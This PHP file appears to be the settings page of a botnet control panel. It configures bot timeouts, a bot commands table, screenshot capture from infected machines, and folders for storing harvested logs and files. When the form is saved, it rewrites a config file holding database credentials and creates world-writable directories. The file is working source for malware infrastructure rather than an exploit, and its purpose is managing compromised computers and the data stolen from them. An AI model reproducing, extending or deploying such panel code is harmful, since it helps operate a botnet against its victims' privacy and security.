<?php if(!defined('__INDEX__'))die();

$opt_logs_db=MODULES&MODULE_LOGS_DB&&MODULES&MODULE_LOGS_WDB;
$opt_logs_fs=MODULES&MODULE_LOGS_FS&&MODULES&MODULE_LOGS_WFS;
$opt_btont=defined('OPT_BTONT')?OPT_BTONT:0;
$path_logs=defined('PATH_LOGS')?PATH_LOGS:'.logs';
$path_lfiles=defined('PATH_LFILES')?PATH_LFILES:'.files';
$opt_lcssf=defined('OPT_LCSSF')?OPT_LCSSF:'jpeg';
$opt_lcssq=defined('OPT_LCSSQ')?OPT_LCSSQ:30;

if($_SERVER['REQUEST_METHOD']=='POST')
{
  $flags=MODULES&~(MODULE_LOGS_WDB|MODULE_LOGS_WFS);
  if(MODULES&MODULE_LOGS_FS&&isset($_POST['path_logs']))$path_logs=trim($_POST['path_logs']);
  if(MODULES&MODULE_LOGS_FILES&&isset($_POST['path_lfiles']))$path_lfiles=trim($_POST['path_lfiles']);
  if(MODULES&MODULE_LOGS_FS&&isset($_POST['opt_logs_fs'])&&strlen($path_logs)>0)$flags|=MODULE_LOGS_WFS;
  if(MODULES&MODULE_LOGS_DB&&isset($_POST['opt_logs_db']))$flags|=MODULE_LOGS_WDB;
  if(isset($_POST['opt_btont'])&&is_numeric($_POST['opt_btont'])&&$_POST['opt_btont']>0&&$_POST['opt_btont']<MAX_BTONT)$opt_btont=$_POST['opt_btont'];
  if(isset($_POST['opt_lcssf']))$opt_lcssf=trim($_POST['opt_lcssf']);
  if(isset($_POST['opt_lcssq'])&&is_numeric($_POST['opt_lcssq'])&&$_POST['opt_lcssq']>0&&$_POST['opt_lcssq']<100)$opt_lcssq=$_POST['opt_lcssq'];
  
  $error=0;
  if($flags&MODULE_LOGS_WFS)
  {
    if(defined('PATH_LOGS')&&PATH_LOGS!=$path_logs&&file_exists(PATH_LOGS))
    {
      if(!is_dir($path_logs)&&!@rename(PATH_LOGS,$path_logs)){SetError(2);$error=1;}
      @chmod($path_logs,0777);
    }
    else if(!is_dir($path_logs)&&!@mkdir($path_logs,0777)){SetError(3);$error=1;}
  }

  if($error==0&&MODULES&MODULE_LOGS_FILES)
  {
    if(defined('PATH_LFILES')&&PATH_LFILES!=$path_lfiles&&file_exists(PATH_LFILES))
    {
      if(!is_dir($path_lfiles)&&!@rename(PATH_LFILES,$path_lfiles)){SetError(4);$error=1;}
      @chmod($path_lfiles,0777);
    }
    else if(!is_dir($path_lfiles)&&!@mkdir($path_lfiles,0777)){SetError(5);$error=1;}
  }

  if($error==0)
  {
    $cfg_data='<?php define(\'MYSQL_HOST\',\''.addslashes(MYSQL_HOST).'\');'.
              'define(\'MYSQL_USER\',\''.addslashes(MYSQL_USER).'\');'.
              'define(\'MYSQL_PASS\',\''.addslashes(MYSQL_PASS).'\');'.
              'define(\'MYSQL_DB\',\''.addslashes(MYSQL_DB).'\');'.
              'define(\'TABLE_USERS\',\''.addslashes(TABLE_USERS).'\');'.
              'define(\'TABLE_STATS\',\''.addslashes(TABLE_STATS).'\');'.
              'define(\'TABLE_IP2C\',\''.addslashes(TABLE_IP2C).'\');'.
              'define(\'TABLE_BIPSP\',\''.addslashes(TABLE_BIPSP).'\');';
    if(MODULES&MODULE_LOGS)
    {
      if(MODULES&MODULE_LOGS_DB)
      {
        $cfg_data.='define(\'TABLE_LOGS\',\''.addslashes(TABLE_LOGS).'\');';
        if(MODULES&MODULE_LOGS_TMPS)$cfg_data.='define(\'TABLE_TMPS\',\''.addslashes(TABLE_TMPS).'\');';
      }
      if(MODULES&MODULE_LOGS_FILES)$cfg_data.='define(\'PATH_LFILES\',\''.addslashes($path_lfiles).'\');';
      if(MODULES&MODULE_LOGS_FS)$cfg_data.='define(\'PATH_LOGS\',\''.addslashes($path_logs).'\');';
    }
    if(MODULES&MODULE_BOTS)
    {
      $cfg_data.='define(\'OPT_BTONT\','.$opt_btont.');';
      if(MODULES&MODULE_BOTS_CMDS)$cfg_data.='define(\'TABLE_BCMDS\',\''.addslashes(TABLE_BCMDS).'\');';
      if(MODULES&MODULE_BOTS_LC_SS)$cfg_data.='define(\'OPT_LCSSF\',\''.addslashes($opt_lcssf).'\');define(\'OPT_LCSSQ\',\''.addslashes($opt_lcssq).'\');';
    }
    $cfg_data.='define(\'MODULES\',\''.sprintf('%u',$flags).'\');?>';
  
    $file=FILE_CONFIG;
    @unlink($file.'.old');
    @rename($file,$file.'.old');
    if(!($f=@fopen($file.'.new','wt')))SetError(1);
    else{if(!@fwrite($f,$cfg_data))SetError(1);@fclose($f);if(!@rename($file.'.new',$file))SetError(0);}
  }
  
  Header('Location: '.QUERY_STRING);
  die();
}

HTMLBegin(LNG_MOPTIONS);
ShowError('LNG_MOPTIONS_ERROR_');
print '<form method="POST"><table class="tbl1">';
if(MODULES&MODULE_BOTS_LC_SS)
{
  $ll=array('jpeg','gif','png');
  print '<tr><td><table class="tbl1" width="100%"><tr><td class="td1" colspan="2">'.LNG_MOPTIONS_LC_SS.'</td></tr>'.
        '<tr><td>'.LNG_MOPTIONS_LC_SS_F.'</td><td><select name="opt_lcssf">';
  foreach($ll as $l)print '<option value="'.$l.'"'.($l==$opt_lcssf?' selected':'').'>'.$l.'</option>';
  print '</select></td></tr><tr><td>'.LNG_MOPTIONS_LC_SS_Q.'</td><td><input size="3" maxlength="3" type="text" name="opt_lcssq" value="'.htmlentities($opt_lcssq).'">&nbsp;%</td></tr></table></td></tr>';
}

if(MODULES&MODULE_LOGS&&(MODULES&MODULE_LOGS_FS||MODULES&MODULE_LOGS_FILES))
{
  print '<tr><td><table class="tbl1" width="100%"><tr><td class="td1" colspan="2">'.LNG_MOPTIONS_LP.'</td></tr>';
  if(MODULES&MODULE_LOGS_FS)
  {
    print '<tr><td>'.LNG_MOPTIONS_LP_LOGS.'</td><td><input style="width:100%" type="text" name="path_logs" value="'.htmlentities($path_logs).'"></td></tr>';
  }
  if(MODULES&MODULE_LOGS_FILES)
  {
    print '<tr><td>'.LNG_MOPTIONS_LP_LFILES.'</td><td><input style="width:100%" type="text" name="path_lfiles" value="'.htmlentities($path_lfiles).'"></td></tr>';
  }
  print '</table></td></tr>';
}
if(MODULES&MODULE_LOGS||MODULES&MODULE_BOTS)
{
  print '<tr><td><table class="tbl1" width="100%"><tr><td class="td1">'.LNG_MOPTIONS_OTHER.'</td></tr>';
  if(MODULES&MODULE_LOGS)
  {
    if(MODULES&MODULE_LOGS_DB)print '<tr><td><input type="checkbox" name="opt_logs_db"'.($opt_logs_db?' checked':'').'>&nbsp;'.LNG_MOPTIONS_DBLOGS.'</td></tr>';
    if(MODULES&MODULE_LOGS_FS)print '<tr><td><input type="checkbox" name="opt_logs_fs"'.($opt_logs_fs?' checked':'').'>&nbsp;'.LNG_MOPTIONS_FSLOGS.'</td></tr>';
  }
  if(MODULES&MODULE_BOTS)
  {
    print '<tr><td>'.LNG_MOPTIONS_BTONT.'&nbsp;<input size="3" maxlength="3" type="text" name="opt_btont" value="'.htmlentities($opt_btont).'"></td></tr>';
  }
  print '</table></td></tr>';
}
print '<tr><td align="right"><input class="ism" type="submit" value="'.LNG_MOPTIONS_SAVE.'"></td></tr></table>';
HTMLEnd();
?>